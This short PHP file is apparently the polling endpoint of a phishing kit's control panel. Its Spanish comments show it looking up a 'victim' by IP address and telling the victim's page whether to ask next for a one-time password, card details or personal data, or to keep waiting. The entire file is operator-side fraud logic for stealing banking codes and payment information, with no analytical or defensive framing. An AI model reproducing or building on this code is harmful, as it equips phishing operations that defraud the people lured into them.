<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];

// Esta función debe devolver qué paso sigue
$estado = consultar_estado_victima($ip); 

if ($estado == "OTP") { 
    echo "2"; // 2 es el caso para OTP en functions.js
} 
elseif ($estado == "TARJETA") { 
    echo "6"; // 6 es el caso para PRODUCT.php (Tarjeta) en functions.js
}
elseif ($estado == "INFO") { 
    echo "4"; // 4 es para pedir datos personales
}
else { 
    echo "0"; // Sigue esperando
}
?>
